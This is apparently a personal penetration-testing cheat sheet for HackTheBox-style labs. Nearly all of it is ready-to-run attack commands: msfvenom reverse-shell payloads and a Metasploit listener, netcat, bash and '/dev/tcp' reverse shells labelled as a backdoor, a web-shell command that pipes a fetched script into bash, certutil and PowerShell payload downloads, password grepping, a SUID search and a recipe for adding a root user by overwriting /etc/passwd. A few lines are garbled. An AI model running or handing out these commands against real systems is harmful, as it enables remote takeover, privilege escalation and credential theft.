-------------------------------------------------<: shellcode generate :>-----------------------------------------------------------

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST 10.10.15.135 LPORT=1234 -f c -b \x00\x0a\x0d 

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.80.151 LPORT=8000 -b "\x00\x25\x26" -f python -v shellcode

==========================================================================================================================================

curl shell:=> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.80.151 8000 >/tmp/f

cat * | grep -i passw*  : find the passwords in one command

python3 -c 'import pty; pty.spawn("/bin/bash") '

sudo python3 -m http.server 80

bash -c "bash -i >& /dev/tcp/10.10.14.18/443 0>&1"

find / -perm -u=s -type f 2>/dev/null 

sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set LHOST 10.11.0.4;\
set LP ORT 80;\
run"
----------------------------------directory_brute------------------------------------------------------------------
gobuster dir -u http://xxxxxxxxxx -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k

gobuster dir -u http://xxxxxxxxxx  -w /usr/share/seclists/Discovery/Web-Content/common.txt

----------------------------------------------subdomain_brute------------------------------------------------------------
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u http://thetoppers.htb --append-domain Host: [word].thetoppers.htb
==============================================================interactive_shell========================================================
python3 -c 'import pty; pty.spawn("/bin/bash") '

SHELL=/bin/bash script -q /dev/null
CTRL+Z
stty raw -echo && fg
export TERM=xterm

============================bash_backdoor================================

bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -I 2>&1|nc 192.168.49.249 80 >/tmp/f


======================================================recieving a file from CMD=============================================

cmd.exe /C certutil -urlcache -split -f http://10.9.80.151:90/winPEASany.exe winpeas.exe

======================================================================================================================
sed -i "s/$port = 1234;/$port = 4444;/g" php-reverse-shell.php

------------------------------shell_with_curl----------------------------------------------
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.135:100/shel.sh|bash

powershell.exe (New-Object system.Net.WebClient).DownloadFile('http://10.15.35.5/payload.exe',' c:\Users\Public\whoami.exe')


 that includes a username, salted/hashed password, UID, GID, directory, and shell .

-----------------------------------------------------openSSL-------------------------------------------------------------------------
#process to make SSL certificate throgh system

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 


openssl passwd -1 -salt salt password : generating password and salt to add into shadow
username:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash

openssl enc -in fake passwd -out /etc/passwd : overwrite protected passwd file with openssl
https://www.youtube.com/watch?v=i3ecAqGlGcc

